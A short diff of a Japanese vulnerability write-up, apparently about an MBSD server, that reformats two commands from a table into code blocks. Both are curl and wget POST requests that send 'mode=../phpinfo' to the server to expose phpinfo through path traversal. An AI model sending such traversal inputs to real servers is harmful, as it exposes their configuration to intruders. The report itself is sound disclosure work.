@@ -307,14 +307,13 @@
 
 * 以下のコマンドによって出力できた。
 
-<table>
-  <tr>
-    <td>$ curl MBSDサーバーIPアドレス -d "mode=../phpinfo&JSON={}"</td>
-  </tr>
-  <tr>
-    <td>$ wget MBSDサーバーIPアドレス --post-data="mode=../phpinfo&JSON={}"</td>
-  </tr>
-</table>
+<code>
+    $ curl MBSDサーバーIPアドレス -d "mode=../phpinfo&JSON={}"
+</code>
+
+<code>
+    $ wget MBSDサーバーIPアドレス --post-data="mode=../phpinfo&JSON={}"
+</code>
 
 
 \[想定される被害・影響]
